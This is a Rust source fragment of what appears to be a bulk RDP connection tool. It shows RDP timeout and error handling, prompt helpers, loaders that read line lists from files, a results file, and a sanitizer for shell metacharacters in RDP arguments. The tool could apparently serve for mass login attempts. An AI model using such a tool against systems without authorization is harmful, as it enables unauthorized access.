        Err(_) => {
            // Timeout occurred - ensure Timeout error type is constructed
            let _ = child.kill().await;
            tokio::time::sleep(Duration::from_millis(200)).await;
            let error_type = classify_rdp_error(Some(131), "Connection timeout");
            // Ensure Timeout variant is constructed
            match error_type {
                RdpError::Timeout => Ok(false),
                _ => Ok(false), // Should not happen, but handle all cases
            }
        }
    }
}

fn prompt_required(msg: &str) -> Result<String> {
    loop {
        print!("{}", format!("{}: ", msg).cyan().bold());
        std::io::stdout().flush().map_err(|e| anyhow!("Failed to flush stdout: {}", e))?;
        let mut s = String::new();
        std::io::stdin().read_line(&mut s)?;
        let trimmed = s.trim();
        if !trimmed.is_empty() {
            return Ok(trimmed.to_string());
        } else {
            println!("{}", "This field is required. Please provide a value.".yellow());
        }
    }
}

fn prompt_default(msg: &str, default_val: &str) -> Result<String> {
    print!("{}", format!("{} [{}]: ", msg, default_val).cyan().bold());
    std::io::stdout().flush().map_err(|e| anyhow!("Failed to flush stdout: {}", e))?;
    let mut s = String::new();
    std::io::stdin().read_line(&mut s)?;
    let trimmed = s.trim();
    Ok(if trimmed.is_empty() {
        default_val.to_string()
    } else {
        trimmed.to_string()
    })
}

fn prompt_yes_no(msg: &str, default_yes: bool) -> Result<bool> {
    let default_char = if default_yes { "y" } else { "n" };
    loop {
        print!("{}", format!("{} (y/n) [{}]: ", msg, default_char).cyan().bold());
        std::io::stdout().flush().map_err(|e| anyhow!("Failed to flush stdout: {}", e))?;
        let mut s = String::new();
        std::io::stdin().read_line(&mut s)?;
        let input = s.trim().to_lowercase();
        if input.is_empty() {
            return Ok(default_yes);
        } else if input == "y" || input == "yes" {
            return Ok(true);
        } else if input == "n" || input == "no" {
            return Ok(false);
        } else {
            println!("{}", "Invalid input. Please enter 'y' or 'n'.".yellow());
        }
    }
}

fn count_lines<P: AsRef<Path>>(path: P) -> Result<usize> {
    let file = File::open(path.as_ref())
        .map_err(|e| anyhow!("Failed to open file '{}': {}", path.as_ref().display(), e))?;
    let reader = BufReader::new(file);
    Ok(reader
        .lines()
        .filter_map(Result::ok)
        .filter(|line| !line.trim().is_empty())
        .count())
}

fn load_lines<P: AsRef<Path>>(path: P) -> Result<Vec<String>> {
    let file = File::open(path.as_ref())
        .map_err(|e| anyhow!("Failed to open file '{}': {}", path.as_ref().display(), e))?;
    let reader = BufReader::new(file);
    Ok(reader
        .lines()
        .filter_map(Result::ok)
        .map(|line| line.trim().to_string())
        .filter(|line| !line.is_empty())
        .collect())
}

fn get_filename_in_current_dir(input_path_str: &str) -> PathBuf {
    let path = Path::new(input_path_str);
    let filename_component = path
        .file_name()
        .map(|os_str| os_str.to_string_lossy())
        .unwrap_or_else(|| std::borrow::Cow::Borrowed(input_path_str));

    let final_name = if filename_component.is_empty()
        || filename_component == "."
        || filename_component == ".."
        || filename_component.contains('/')
        || filename_component.contains('\\')
    {
        "rdp_results.txt"
    } else {
        filename_component.as_ref()
    };

    PathBuf::from(format!("./{}", final_name))
}

fn sanitize_rdp_argument(input: &str) -> String {
    input.chars()
        .map(|c| match c {
            // Handle whitespace characters first (before control character range)
            '\n' | '\r' | '\t' => ' ',
            // Dangerous shell metacharacters
            '|' | '&' | ';' | '(' | ')' | '<' | '>' | '`' | '$' | '!' | '\\' => '?',
            // Quotes that could break argument parsing
            '"' | '\'' => '?',
            // Control characters (excluding \n, \r, \t which are handled above)
            // \x00-\x08, \x0b-\x0c, \x0e-\x1f, \x7f
            '\x00'..='\x08' | '\x0b'..='\x0c' | '\x0e'..='\x1f' | '\x7f' => '?',
            // Extended ASCII control characters
            '\u{0080}'..='\u{009f}' => '?',
            // Safe characters
            c => c,
        })
        .collect()
}

fn should_use_streaming<P: AsRef<Path>>(path: P) -> Result<bool> {
    let metadata = std::fs::metadata(path.as_ref())
        .map_err(|e| anyhow!("Failed to get file metadata: {}", e))?;
    Ok(metadata.len() > MAX_MEMORY_LOAD_SIZE)
}

fn format_file_size(size: u64) -> String {
    const UNITS: &[&str] = &["B", "KB", "MB", "GB"];
    let mut size = size as f64;
    let mut unit_index = 0;

    while size >= 1024.0 && unit_index < UNITS.len() - 1 {
        size /= 1024.0;
        unit_index += 1;
    }

    format!("{:.1} {}", size, UNITS[unit_index])
}

fn format_socket_address(ip: &str, port: u16) -> String {
    let trimmed_ip = ip.trim_matches(|c| c == '[' || c == ']');
    if trimmed_ip.contains(':') && !trimmed_ip.contains("]:") {
        format!("[{}]:{}", trimmed_ip, port)
    } else {
        format!("{}:{}", trimmed_ip, port)
    }
}